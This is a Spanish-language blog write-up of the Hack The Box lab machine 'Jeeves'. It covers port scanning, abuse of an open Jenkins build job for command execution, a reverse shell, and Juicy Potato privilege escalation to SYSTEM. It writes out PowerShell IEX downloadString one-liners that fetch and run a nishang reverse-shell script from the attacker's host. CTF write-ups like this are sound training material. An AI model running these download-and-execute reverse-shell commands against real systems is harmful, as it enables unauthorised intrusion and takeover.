<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Jeeves Writeup [ES] - HackTheBox" /><meta property="og:locale" content="en" /><meta name="description" content="Jeeves es una máquina Windows de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla." /><meta property="og:description" content="Jeeves es una máquina Windows de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla." /><link rel="canonical" href="https://brsalcedom.github.io/Jeeves-Writeup-HackTheBox/" /><meta property="og:url" content="https://brsalcedom.github.io/Jeeves-Writeup-HackTheBox/" /><meta property="og:site_name" content="brsalcedom" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-01T17:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Jeeves Writeup [ES] - HackTheBox" /><meta name="twitter:site" content="@Cervant_0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-11-01T17:00:00-03:00","datePublished":"2021-11-01T17:00:00-03:00","description":"Jeeves es una máquina Windows de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla.","headline":"Jeeves Writeup [ES] - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"https://brsalcedom.github.io/Jeeves-Writeup-HackTheBox/"},"url":"https://brsalcedom.github.io/Jeeves-Writeup-HackTheBox/"}</script><title>Jeeves Writeup [ES] - HackTheBox | brsalcedom</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="brsalcedom"><meta name="application-name" content="brsalcedom"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">brsalcedom</a></div><div class="site-subtitle font-italic">Personal Cybersecurity & Pentesting blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/brsalcedom" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Cervant_0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['brsalcedom','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Jeeves Writeup [ES] - HackTheBox</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Jeeves Writeup [ES] - HackTheBox</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1635796800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-11-01 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1179 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p><a href="https://app.hackthebox.com/machines/114">Jeeves</a> es una máquina <strong>Windows</strong> de dificultad media ofrecida por la plataforma de <a href="https://app.hackthebox.com/">Hack The Box</a>. A lo largo de este post encontrarás un writeup mostrando la forma de como rootearla.</p><h2 id="información"><span class="mr-2">Información</span><a href="#información" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/images/HTB/Jeeves/01-info.png" alt="Info" data-proofer-ignore></p><h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Como siempre, partiremos realizando un escaneo general de los 65535 puertos.</p><ul><li><code class="language-plaintext highlighter-rouge">nmap -sS -p- --min-rate 4000 -v -n -Pn 10.10.10.63 -oG allPorts.gnmap</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 21:01 -03
Nmap scan report for 10.10.10.63
Host is up (0.15s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 33.08 seconds
</pre></table></code></div></div><p>Posteriormente realizamos un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados.</p><ul><li><code class="language-plaintext highlighter-rouge">nmap -sC -sV -p80,135,445,50000 -n -v 10.10.10.63 -oN ports.nmap</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 21:06 -03
Nmap scan report for 10.10.10.63
Host is up (0.15s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h13m41s, deviation: 0s, median: 5h13m40s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-11-02T05:20:15
|_  start_date: 2021-11-02T05:13:21

Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
</pre></table></code></div></div><h3 id="enumeración-web"><span class="mr-2">Enumeración web</span><a href="#enumeración-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Partimos por verificar lo que nos encontramos en los puertos 80 y 5000.</p><ul><li><code class="language-plaintext highlighter-rouge">whatweb http://10.10.10.63</code><li><code class="language-plaintext highlighter-rouge">whatweb http://10.10.10.63:5000</code></ul><p><img data-src="/images/HTB/Jeeves/05-enumeracion-web.png" alt="" data-proofer-ignore></p><h4 id="http10101063"><span class="mr-2">http://10.10.10.63</span><a href="#http10101063" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>En el home nos encontramos con esta página que nos invita a utilizar el buscador Ask Jeeves.</p><p><img data-src="/images/HTB/Jeeves/15-web1.png" alt="" data-proofer-ignore></p><p>Sin embargo, al darle al botón <strong>Search</strong> nos redirige a https://10.10.10.63/error.html y nos arroja un error.</p><p><img data-src="/images/HTB/Jeeves/16-web2.png" alt="" data-proofer-ignore></p><p>Al darle un vistazo al código fuente, nos enteramos que es una imagen estática que se consulta.</p><p><img data-src="/images/HTB/Jeeves/17-web3.png" alt="" data-proofer-ignore></p><p>Como no se ve nada más que pueda ser de interés, lo siguiente será realizar <strong>fuzzing</strong> sobre esta ruta. Para ello, en esta ocasión utilizaré <a href="https://github.com/epi052/feroxbuster">Feroxbuster</a> el cual es un fuzzer recursivo, buena alternativa de gobuster/wfuzz.</p><ul><li><code class="language-plaintext highlighter-rouge">./feroxbuster --url http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300</code></ul><p><img data-src="/images/HTB/Jeeves/11-0-feroxbuster.png" alt="" data-proofer-ignore></p><p>Y en este caso no encontramos nada adicional, por lo tanto, es tiempo de avanzar. Realizaremos el mismo proceso sobre el web server del puerto 50000</p><h4 id="http1010106350000"><span class="mr-2">http://10.10.10.63:50000</span><a href="#http1010106350000" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>Bajo esta ruta nos encontramos un home con una página de error. Además de un mensaje que nos indica la versión de jetty y un enlace que nos redirige a http://www.eclipse.org/jetty/</p><p><img data-src="/images/HTB/Jeeves/20-secondary-webserver.png" alt="" data-proofer-ignore></p><p>Nuevamente no hay mucho más que ver, por lo tanto es hora del <strong>fuzzing</strong>.</p><ul><li><code class="language-plaintext highlighter-rouge">./feroxbuster --url http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 300</code></ul><p><img data-src="/images/HTB/Jeeves/11-feroxbuster.png" alt="" data-proofer-ignore></p><p>Vemos que esta vez si tuvimos suerte y Feroxbuster nos proporciona la ruta http://10.10.10.63:50000/askjeeves como válida. Consultando el recurso visualizamos lo siguiente.</p><p><img data-src="/images/HTB/Jeeves/25-jenkins.png" alt="" data-proofer-ignore></p><p>Un <strong>Jenkins</strong> de versión 2.87. Como primer paso buscamos vulnerabilidades asociadas en exploitdb sin tener éxito.</p><h2 id="ganando-acceso"><span class="mr-2">Ganando acceso</span><a href="#ganando-acceso" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Siguiendo adelante, intentaremos crear un proyecto nuevo para verificar si tenemos algún permiso de ejecución de tareas.</p><p><img data-src="/images/HTB/Jeeves/25.1-create-project.png" alt="" data-proofer-ignore></p><p>En la sección <strong>Build</strong> especificamos que durante la ejecución de la tarea, queremos lanzar comandos de Windows.</p><p><img data-src="/images/HTB/Jeeves/25.2-configure-project.png" alt="" data-proofer-ignore></p><p>En primera instancia ejecutaremos un ping hacia nuestra IP para verificar si es posible ejecutar comandos.</p><p><img data-src="/images/HTB/Jeeves/25.30-ping-command.png" alt="" data-proofer-ignore></p><p>Una vez que escribimos la instrucción, guardamos el proyecto y le damos a <strong>Build Now</strong>.</p><p><img data-src="/images/HTB/Jeeves/25.4-execute-command.png" alt="" data-proofer-ignore></p><p>Posteriormente veremos una entrada en el <strong>Build history</strong>, clikamos ahí y entraremos al detalle de la ejecución de nuestra tarea.</p><p><img data-src="/images/HTB/Jeeves/25.6-execute-command.png" alt="" data-proofer-ignore></p><p>Vamos a <strong>Console Output</strong> y validamos que efectivamente el ping se emitió sin problemas.</p><p><img data-src="/images/HTB/Jeeves/25.5-execute-command.png" alt="" data-proofer-ignore></p><p>Ya esta vez intentaremos obtener nuestra reverse shell utilizando netcat compartido a través de un recurso en red SMB. Primero disponibilizamos el binario utilizando impacket.</p><ul><li><code class="language-plaintext highlighter-rouge">impacket-smbserver SharedFolder . -smb2support</code></ul><p><img data-src="/images/HTB/Jeeves/29-impacket.png" alt="" data-proofer-ignore></p><p>Paralelamente iniciamos un canal de escucha para el puerto 443.</p><p><img data-src="/images/HTB/Jeeves/30.5-reverse-shell-listener.png" alt="" data-proofer-ignore></p><p>Modificamos la tarea para incluir la instrucción de generar una reverse shell hacia nuestra máquina por el puerto 443.</p><p><img data-src="/images/HTB/Jeeves/25.3-shell-command.png" alt="" data-proofer-ignore></p><p>Le damos a <strong>Build Now</strong> y veremos que obtendremos nuestra conexión.</p><p><img data-src="/images/HTB/Jeeves/30-sharedfolder-reverse.png" alt="" data-proofer-ignore></p><p>Tenemos acceso con el usuario <strong>kohsuke</strong></p><h2 id="escalando-privilegios"><span class="mr-2">Escalando privilegios</span><a href="#escalando-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="preparativos"><span class="mr-2">Preparativos</span><a href="#preparativos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Antes de realizar la escalada de privilegios, realizaremos el mismo proceso anterior para obtener una reverse shell, pero en este caso, usaremos <a href="https://github.com/samratashok/nishang">nishang</a> para obtener una consola PowerShell. Estos son los pasos:</p><ul><li>Clonar el repositorio <code class="language-plaintext highlighter-rouge">git clone https://github.com/samratashok/nishang</code><li>Ir a <em>nishang/shells</em>, editar archivo <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> y añadir <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 8001</code> al final del script.<li>Mover el archivo a nuestro directorio de trabajo y renombrarlo como IPS.ps1.<li>Montar un servidor web para compartir dicho archivo <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code>.<li>Ponernos a la escucha de tráfico a través del puerto 8001.<li>Ejecutar nueva tarea de <strong>Jenkins</strong> para obtener consola Powershell.</ul><p><code class="language-plaintext highlighter-rouge">powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/IPS.ps1')</code></p><p><img data-src="/images/HTB/Jeeves/34-powershell-reverse.png" alt="" data-proofer-ignore></p><p><img data-src="/images/HTB/Jeeves/35-powershell-reverse.png" alt="" data-proofer-ignore></p><h3 id="reconocimiento"><span class="mr-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Ya en este punto, lo primero a realizar es un reconocimiento del sistema, para saber con que S.O. estamos tratando, que usuario somos y que permisos tenemos asignados.</p><ul><li><code class="language-plaintext highlighter-rouge">systeminfo</code></ul><p><img data-src="/images/HTB/Jeeves/40-systeminfo.png" alt="" data-proofer-ignore></p><ul><li><code class="language-plaintext highlighter-rouge">whoami /priv</code></ul><p><img data-src="/images/HTB/Jeeves/45-whoami-priv.png" alt="" data-proofer-ignore></p><p>Validamos que estamos en una máquina <strong>Windows 10 Pro de 64 bits</strong> y ésta mantiene el permiso <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado. Sabiendo esto, podríamos intentar utilizar <a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> para explotarlo.</p><h3 id="explotación"><span class="mr-2">Explotación</span><a href="#explotación" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Primero descargamos el binario de Juicy Potato desde <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1">Releases</a> y lo llevamos a la máquina víctima utilizando impacket.</p><p><img data-src="/images/HTB/Jeeves/50-copy-juicy.png" alt="" data-proofer-ignore></p><p>El binario se ha exportado a la ruta <code class="language-plaintext highlighter-rouge">C:\Users\Public</code> con el nombre de <code class="language-plaintext highlighter-rouge">JP.exe</code>.</p><p>Reverse shell con <strong>powershell</strong></p><ul><li><code class="language-plaintext highlighter-rouge">.\JP.exe -t * -l 1337 -p cmd.exe -a "/c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/IPS.ps1')"</code></ul><p>Al igual que antes, compartiremos el archivo <code class="language-plaintext highlighter-rouge">IPS.ps1</code> con un servidor web en <strong>python3</strong>, previamente configurado para entablar una conexión hacia nuestra IP por el puerto 8002.</p><p><img data-src="/images/HTB/Jeeves/55-admin-reverse.png" alt="" data-proofer-ignore></p><p>Al obtener la consola, ya seríamos <strong>NT AUTHORITY\SYSTEM</strong>. Ahora solo restaría encontrar las flags, leer su contenido e ingresarlas en la plataforma de HTB.</p><h2 id="usertxt"><span class="mr-2">user.txt</span><a href="#usertxt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Buscar archivos con <strong>powershell</strong></p><ul><li><code class="language-plaintext highlighter-rouge">Get-ChildItem -Path C:\ -Recurse -Include user.txt</code></ul><p><img data-src="/images/HTB/Jeeves/60-user.txt.png" alt="" data-proofer-ignore></p><p>Variación para obtener la ruta completa del archivo.</p><ul><li><code class="language-plaintext highlighter-rouge">Get-ChildItem -Path C:\ -Recurse -Include user.txt | select FullName</code></ul><p><img data-src="/images/HTB/Jeeves/65-user.txt-full.png" alt="" data-proofer-ignore></p><p>Leyendo la flag user.txt</p><ul><li><code class="language-plaintext highlighter-rouge">type C:\Users\kohsuke\Desktop\user.txt</code></ul><p><img data-src="/images/HTB/Jeeves/70-read-user.txt.png" alt="" data-proofer-ignore></p><h2 id="roottxt"><span class="mr-2">root.txt</span><a href="#roottxt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Para esta flag la cosa se complica un poco, ya que no la encontraremos por métodos convencionales. Al buscar por todos los archivos con extensión <code class="language-plaintext highlighter-rouge">.txt</code> dentro del home del usuario <strong>Administrator</strong> encontraremos un archivo interesante.</p><p><img data-src="/images/HTB/Jeeves/71-admin-txt-files.png" alt="" data-proofer-ignore></p><p>Al leer <code class="language-plaintext highlighter-rouge">hm.txt</code> veremos lo siguiente.</p><blockquote><p>The flag is elsewhere. Look deeper.</p></blockquote><p><img data-src="/images/HTB/Jeeves/72-root-hint.png" alt="" data-proofer-ignore></p><p>Después de muchos intentos y buscar información con el confiable <strong>Google</strong> llegamos a un <a href="https://davidhamann.de/2019/02/23/hidden-in-plain-sight-alternate-data-streams/">artículo</a> que explica como esconder información en un archivo utilizando <strong><em>ADS - Alternate Data Streams</em></strong>. También explica como extraer información de estos streams.</p><ol><li>Utilizando <code class="language-plaintext highlighter-rouge">Get-Item</code> buscaremos todos los streams de manera recursiva en la ruta <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop</code>.<ul><li><code class="language-plaintext highlighter-rouge">Get-Item C:\Users\Administrator\Desktop\*.txt -stream *</code></ul><li>Obtendremos el contenido con <code class="language-plaintext highlighter-rouge">Get-Content</code> especificando el nombre del stream que queremos leer.<ul><li><code class="language-plaintext highlighter-rouge">Get-Content hm.txt -stream root.txt</code></ul></ol><p><img data-src="/images/HTB/Jeeves/75-read-root.txt.png" alt="" data-proofer-ignore></p><p>Como se ve en la imagen, el archivo <code class="language-plaintext highlighter-rouge">hm.txt</code> contenía un stream llamado <code class="language-plaintext highlighter-rouge">root.txt</code> con el hash de la flag en su interior.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/tags/jenkins/" class="post-tag no-text-decoration" >jenkins</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Jeeves Writeup [ES] - HackTheBox - brsalcedom&amp;url=https://brsalcedom.github.io/Jeeves-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Jeeves Writeup [ES] - HackTheBox - brsalcedom&amp;u=https://brsalcedom.github.io/Jeeves-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brsalcedom.github.io/Jeeves-Writeup-HackTheBox/&amp;text=Jeeves Writeup [ES] - HackTheBox - brsalcedom" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/HackPark-Writeup-TryHackMe/"><div class="card-body"> <em class="timeago small" data-ts="1596240000" > 2020-07-31 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackPark Writeup - TryHackMe</h3><div class="text-muted small"><p> This time we will be solving the HackPark room from TryHackMe. This box is part of the Offensive pentesting learning path so it will be very useful for our OSCP journey. Room info Enumeration ...</p></div></div></a></div><div class="card"> <a href="/RootMe-Writeup-TryHackMe/"><div class="card-body"> <em class="timeago small" data-ts="1617350400" > 2021-04-02 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>RootMe Writeup [ES] - TryHackMe</h3><div class="text-muted small"><p> En esta ocasión estaré resolviendo el lab RootMe de la plataforma TryHackMe. Esta máquina es bastante sencilla como se verá a continuación. Lab info Task 1 - Deploy the machine Desplegar la má...</p></div></div></a></div><div class="card"> <a href="/PickleRick-Writeup-TryHackMe/"><div class="card-body"> <em class="timeago small" data-ts="1617523200" > 2021-04-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pickle Rick Writeup - TryHackMe</h3><div class="text-muted small"><p> This time i’ll be working with the room Pickle Rick from TryHackMe. This is a free lab with an easy difficulty. Lab info Enumeration All ports nmap scan: nmap -p- -sS --min-rate 5000 -n -v 10....</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Legacy-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Older"><p>Legacy Writeup [ES] - HackTheBox</p></a> <a href="/Bastard-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Newer"><p>Bastard Writeup [ES] - HackTheBox</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
